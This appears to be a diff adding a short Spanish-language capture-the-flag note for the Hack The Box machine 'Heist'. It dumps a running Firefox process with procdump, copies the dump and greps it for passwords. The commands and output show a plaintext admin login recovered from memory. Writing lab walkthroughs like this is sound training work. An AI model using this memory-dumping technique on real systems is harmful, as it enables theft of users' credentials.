@@ -1,0 +1,40 @@
+
+[MAQUINA HEIST]
+
+[*] Vamos a volcar un proceso en este caso de firefox para poder obtener de un archivo .tmp passwords en el caso de que se acontezca
+
+[*] Usaremos la herramienta procdump
+
+https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
+
+[*] Veremos que el proceso de firefox estara abierto
+
+  > ps | findstr firefo
+
+  [+] Output:
+    401      36    49268      34248       2.52   5324   1 firefox
+   1091      77   191316      94268      10.64   5780   1 firefox
+    347      19    10256      11940       0.11   6008   1 firefox
+    378      29    30004      21092       0.52   6324   1 firefox
+    355      25    16404      11196       0.17   6992   1 firefox
+
+[*] Ahora ya ejecutaremos el procdump para volcar un proceso a un archivo de esta forma
+
+  > .\procdump.exe -ma 5324
+
+  [+] Output:
+
+  [21:48:55] Dump 1 initiated: C:\Windows\Temp\Privesc\firefox.exe_220812_214855.dmp
+  [21:48:55] Dump 1 writing: Estimated dump file size is 354 MB.
+  [21:48:59] Dump 1 complete: 354 MB written in 3.3 seconds
+  [21:48:59] Dump count reached.
+
+[*] Nos crea un archivo con lo volcado de firefox, nos lo pasamos a nuestra maquina y grepeamos por la palabra password
+
+  ~$> strings firefox.exe_220812_214855.dmp | grep password
+
+  [+] Output:
+
+  MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+  RG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+  MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
